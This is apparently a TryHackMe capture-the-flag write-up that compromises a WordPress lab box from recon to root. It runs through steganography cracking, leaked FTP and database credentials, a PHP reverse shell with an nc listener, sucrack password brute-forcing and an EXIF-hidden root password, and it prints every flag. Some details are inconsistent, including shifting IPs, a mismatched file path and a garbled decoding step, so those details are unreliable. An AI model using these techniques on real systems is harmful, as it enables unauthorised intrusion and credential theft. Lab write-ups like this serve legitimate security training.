# TRYHACKME — DIFFERENT CTF

A WordPress box that chains steganography → leaked FTP creds → phpMyAdmin → vhost discovery → WordPress RCE → SUID password‑cracker → SUID "riddle" binary → EXIF hex/Base85 root creds.

\---

## Recon

### Nmap

```bash
┌──(lightningf4st㉿kali)-\[\~/Tryhackme/diff\_ctf]
└─$ nmap -Pn -sS -sV -sC -A -T4 -p- 10.49.148.17
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|\_http-server-header: Apache/2.4.29 (Ubuntu)
|\_http-title: Hello World — Just another WordPress site
|\_http-generator: WordPress 5.6
```

Two open ports: `vsftpd 3.0.3` on 21 and a stock WordPress 5.6 install on 80.

### Gobuster

```bash
┌──(lightningf4st㉿kali)-\[\~/Tryhackme/diff\_ctf]
└─$ gobuster dir -u http://10.49.173.21 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
/wp-content      (Status: 301) \[--> http://10.49.173.21/wp-content/]
/announcements   (Status: 301) \[--> http://10.49.173.21/announcements/]
/wp-includes     (Status: 301) \[--> http://10.49.173.21/wp-includes/]
/javascript      (Status: 301) \[--> http://10.49.173.21/javascript/]
/wp-admin        (Status: 301) \[--> http://10.49.173.21/wp-admin/]
/phpmyadmin      (Status: 301) \[--> http://10.49.173.21/phpmyadmin/]
```

`/phpmyadmin` and `/announcements` stand out — a phpMyAdmin panel next to a normal WordPress install, and a dir that isn't part of core WP at all.

\---

## Steganography → FTP creds

Poking around `/announcements` turned up an image, `australian-bulldog-ant.jpg`. Threw it at **stegseek** with rockyou:

```bash
┌──(lightningf4st㉿kali)-\[\~/Tryhackme/diff\_ctf]
└─$ stegseek australian-bulldog-ant.jpg wordlist.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

\[i] Found passphrase: "123adanaantinwar"
\[i] Original filename: "user-pass-ftp.txt".
\[i] Extracting to "australian-bulldog-ant.jpg.out".
```

```bash
┌──(lightningf4st㉿kali)-\[\~/Tryhackme/diff\_ctf]
└─$ cat australian-bulldog-ant.jpg.out
RlRQLUxPR0lOOlVTRVI6aGFrYW5mdHAKUEFTUzoxMjNhZGFuYWNyYWNr=

┌──(lightningf4st㉿kali)-\[\~/Tryhackme/diff\_ctf]
└─$ echo "RlRQLUxPR0lOOlVTRVI6aGFrYW5mdHAKUEFTUzoxMjNhZGFuYWNyYWNr=" | base64 -d
FTP-LOGIN
USER: hakanftp
PASS: 123adanacrack
```

Steg passphrase cracked with a wordlist, hidden file decoded from base64 → clean FTP creds.

\---

## FTP → wp-config.php → phpMyAdmin → vhost

```bash
┌──(lightningf4st㉿kali)-\[\~/Tryhackme/diff\_ctf]
└─$ ftp 10.49.173.21
Name (10.49.173.21:lightningf4st): hakanftp
Password: 123adanacrack
230 Login successful.

ftp> ls -al
-rw-r--r--   1 1001     1001         3194 Jan 11  2021 wp-config.php
drwxr-xr-x   2 0        0            4096 Jan 14  2021 announcements
```

Pulled `wp-config.php` and grabbed the DB creds straight out of it:

```php
define( 'DB\_NAME', 'phpmyadmin1' );
define( 'DB\_USER', 'phpmyadmin' );
define( 'DB\_PASSWORD', '12345' );
define( 'DB\_HOST', 'localhost' );
```

`phpmyadmin : 12345` logs straight into `/phpmyadmin`. Browsed to the `wp\_options` table of the `phpmyadmin1` DB:

|option\_name|option\_value|
|-|-|
|siteurl|`http://subdomain.adana.thm`|
|home|`http://subdomain.adana.thm`|

The real site is behind a vhost, not the bare IP. Added it to `/etc/hosts`:

```bash
echo "10.49.173.21 subdomain.adana.thm" | sudo tee -a /etc/hosts
```

Browsing to `subdomain.adana.thm` loads the actual "Hello World" WordPress blog, posted by `hakanbey01`.

\---

## Foothold — WordPress → reverse shell

With DB access via phpMyAdmin (and the WP admin panel reachable through the vhost), a PHP reverse shell was staged as `revshell.php`:

```bash
┌──(lightningf4st㉿kali)-\[\~/Tryhackme/diff\_ctf]
└─$ chmod 777 revshell.php
```

Set up a listener and dropped the shell in through the WordPress theme editor, then browsed to it to trigger execution:

```bash
┌──(lightningf4st㉿kali)-\[\~/Tryhackme/diff\_ctf]
└─$ stty raw -echo; fg
\[1]  + continued  nc -nvlp 1235
```

Navigating to `subdomain.adana.thm/shell1.php` in the browser popped the shell as `www-data`:

```bash
www-data@ubuntu:/var/www/html$ cd /var/www/html \&\& ls -al
-rwxrwxrwx 1 hakanbey hakanbey    38 Jan 14  2021 wwe3bbfla4g.txt
www-data@ubuntu:/var/www/html$ cat wwe3bbfla4g.txt
THM{343a7e2064a1d992c01ee201c346edff}
```

**Flag 1 (webshell):** `THM{343a7e2064a1d992c01ee201c346edff}`

\---

## Privesc #1 — cracking `hakanbey` with a custom SUID cracker

Already had a `wordlist.txt` and the username `hakanbey` in hand, and `/tmp` had a leftover build of a password cracker called **sucrack** — so used it to crack `hakanbey`'s password:

```bash
www-data@ubuntu:/tmp/sucrack/src$ ./sucrack -w 200 -u hakanbey ../../wordlist.txt
bye, bye...
```

Straight rockyou didn't land it, but the steg passphrase earlier (`123adanaantinwar`) and the FTP pass (`123adanacrack`) both start with `123adana` — so a prefixed wordlist was worth a shot:

```bash
www-data@ubuntu:/tmp/sucrack/src$ sed 's/^/123adana/' ../../wordlist.txt > ../../prefix\_list.txt
www-data@ubuntu:/tmp/sucrack/src$ ./sucrack -w 200 -u hakanbey ../../prefix\_list.txt
8872/803891
password is: 123adanasubaru
```

```bash
www-data@ubuntu:/$ su hakanbey
Password: 123adanasubaru
hakanbey@ubuntu:\~$ cat user.txt
THM{8ba9d7715fe726332b7fc9bd00e67127}
```

**Flag 2 (user):** `THM{8ba9d7715fe726332b7fc9bd00e67127}`

`hakanbey`'s home also has a symlink worth noting for later:

```
lrwxrwxrwx 1 root root 19 Jan 11  2021 website -> /var/www/subdomain/
```

\---

## Privesc #2 — root

`/usr/bin/binary` is a riddle/SUID binary sitting in `hakanbey`'s reach:

```bash
hakanbey@ubuntu:/usr/bin$ ./binary
I think you should enter the correct string here ==>warzoneinadana
Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)

Copy /root/root.jpg ==> /home/hakanbey/Desktop/root.jpg
```

Entering `warzoneinadana` triggers the binary's elevated copy of `/root/root.jpg` into `hakanbey`'s Desktop (only root can normally read into `/root`). From there it was moved into the web-accessible `/var/www/subdomain` (thanks to that `website` symlink from earlier) and pulled down over HTTP:

```bash
hakanbey@ubuntu:/usr/bin$ cp /home/hakanbey/root.jpg /var/www/subdomain
hakanbey@ubuntu:\~/Desktop$ python3 -m http.server 9090
Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
192.168.140.36 - - \[18/Aug/2026 09:13:53] "GET /root.jpg HTTP/1.1" 200 -
```

On the attacker box, the hint said the answer lives at hex offset `00000020` — so `root.jpg` got a quick `xxd`:

```bash
┌──(lightningf4st㉿kali)-\[/tmp]
└─$ xxd root.jpg
00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0060  ....JFIF.....`
00000010: 0060 0000 ffe1 0078 4578 6966 0000 4d4d  .`.....xExif..MM
00000020: fee9 9d3d 7918 5ffc 826d df1c 69ac c275  ...=y...m..i.u
```

That row of hex (`fee9 9d3d 7918 5ffc 826d df1c 69ac c275`) isn't real JFIF/EXIF data — it's the payload. Ran it through **CyberChef**:

**Recipe:** `From Hex` → `To Base85`

```
Input:  fee9 9d3d 7918 5ffc 826d df1c 69ac c275
Output: root:Go0odJo0BbBro0o
```

Root creds, hidden in the EXIF header of a JPEG as raw hex, decoded via Base85.

```bash
hakanbey@ubuntu:\~$ su root
Password: Go0odJo0BbBro0o
root@ubuntu:\~# cat root.txt
THM{c5a9d3e4147a13cbd1ca24b014466a6c}
```

**Flag 3 (root):** `THM{c5a9d3e4147a13cbd1ca24b014466a6c}`

\---

## Summary

|Stage|Technique|
|-|-|
|Recon|`nmap`, `gobuster`|
|Cred leak #1|LSB steganography (`stegseek`) on a hosted image → base64-encoded FTP creds|
|Cred leak #2|`wp-config.php` pulled over anonymous-ish FTP → DB creds → phpMyAdmin|
|Vhost discovery|`wp\_options.siteurl` in phpMyAdmin → `/etc/hosts` entry|
|Foothold|WordPress theme editor → PHP reverse shell → `www-data`|
|Privesc → hakanbey|Leftover SUID `sucrack` binary + wordlist prefixed with a reused passphrase fragment|
|Privesc → root|SUID riddle binary leaks `/root/root.jpg` → hex payload in EXIF header → CyberChef `From Hex` → `To Base85` → root password|

**Flags:**

* `THM{343a7e2064a1d992c01ee201c346edff}`
* `THM{8ba9d7715fe726332b7fc9bd00e67127}`
* `THM{c5a9d3e4147a13cbd1ca24b014466a6c}`

